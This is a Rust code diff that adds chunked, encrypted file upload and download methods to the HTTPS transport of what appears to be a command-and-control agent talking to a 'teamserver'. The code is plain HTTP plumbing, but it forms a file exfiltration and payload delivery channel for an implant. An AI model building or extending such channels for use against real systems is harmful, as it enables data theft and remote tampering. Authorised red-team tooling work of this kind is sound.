@@ -1,4 +1,5 @@
 use crate::config::AgentConfig;
+use crate::protocol::{FileDownloadResponse, FileUploadRequest, FileUploadResponse};
 use anyhow::{anyhow, Context};
 use rand::Rng;
 use reqwest::Client;
@@ -106,6 +107,37 @@ impl HttpsTransport {
         }
 
         Err(anyhow!("failed to post after retries"))
+    }
+
+    /// Uploads an encrypted file chunk to the teamserver.
+    pub async fn upload_file_chunk(
+        &self,
+        request: &FileUploadRequest,
+    ) -> anyhow::Result<FileUploadResponse> {
+        let res = self.post_json("/api/files/upload", request).await?;
+        let response: FileUploadResponse =
+            serde_json::from_slice(&res.body).context("failed to parse upload response")?;
+        Ok(response)
+    }
+
+    /// Downloads an encrypted file chunk from the teamserver.
+    pub async fn download_file_chunk(
+        &self,
+        agent_id: &str,
+        token: &str,
+        file_id: &str,
+        chunk_number: usize,
+    ) -> anyhow::Result<FileDownloadResponse> {
+        let request = crate::protocol::FileDownloadRequest {
+            agent_id: agent_id.to_string(),
+            token: token.to_string(),
+            file_id: file_id.to_string(),
+            chunk_number,
+        };
+        let res = self.post_json("/api/files/download", &request).await?;
+        let response: FileDownloadResponse =
+            serde_json::from_slice(&res.body).context("failed to parse download response")?;
+        Ok(response)
     }
 
     fn calculate_backoff(&self, attempt: usize) -> Duration {
